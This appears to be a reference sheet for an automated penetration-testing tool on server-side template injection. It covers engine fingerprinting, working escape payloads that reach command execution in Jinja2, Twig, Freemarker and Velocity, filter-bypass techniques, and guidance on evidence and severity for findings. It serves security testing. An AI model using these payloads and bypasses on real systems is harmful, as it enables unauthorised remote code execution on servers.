# SSTI — depth reference

Load when `ssti` confirmed template evaluation and you need engine
identification or an engine-specific escape. `probe_ssti` fires `{{a+b}}` and
variants; this file covers what to do with the engine once identified.

## Engine detection flowchart

```
{{7*7}} → 49?
├── yes → {{7*'7'}}:
│   ├── 7777777 → Jinja2 (Python string repeat)
│   └── 49      → Twig (PHP numeric cast)
├── no → ${7*7} → 49?
│   ├── yes → ${"abc".length()}: 3 → Freemarker, error → Velocity
│   └── no → #{7*7} → 49 → Thymeleaf
└── no → <%= 7*7 %> → 49 → ERB / EJS-adjacent
```

Framework prior (from `fingerprint`): Flask/Django→Jinja2, Laravel→Blade/Twig,
Spring→Freemarker/Thymeleaf, Express→EJS/Pug/Nunjucks. Error text names the
engine directly when debug output leaks (`jinja2.exceptions…`,
`Twig\Error\…`, `freemarker.core…`).

## Jinja2 escape path

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}          # enumerate classes
{{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['popen']('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

Subclass index varies by Python version — enumerate and grep the printed
list for `os._wrap_close`, `subprocess.Popen`, `warnings.catch_warnings`
before indexing. Confirm with a sleep/id first, not a file write.

## Twig escape path

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}                       # older Twig
{{app.request.server.get("DOCUMENT_ROOT")}}       # info leak via app
```

## Freemarker / Velocity

```java
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}   // Freemarker
${class.forName("java.lang.Runtime").getRuntime().exec("id")}       // Velocity classTool
```

## Filter bypass

| Blocked | Technique |
|---|---|
| `__` dunder | string concat `'__cla'+'ss__'`, `|attr("__class__")`, dict-key trick `request[dict(__class__=1).keys()\|join]` |
| quotes | `request.args.x` index trick — put the index in the URL param |
| keywords | `{{"sys"+"tem"}}` concat, hex `\x5f` escapes |
| delimiters | `${…}` `#{…}` `<%…%>` alternates per engine |

## Evidence honesty

An evaluated `{{7*7}}`→49 is *template injection confirmed* — code execution
is a separate claim needing an `id`/`sleep`/OOB marker. Report the engine
name in the finding; "SSTI exists" without engine naming under-rates and
over-rates are both wrong.

## Severity guide

- Command exec or file read proven: critical
- Eval confirmed + engine named, escape path plausible: high
- Eval confirmed but sandboxed/error on every escape: medium
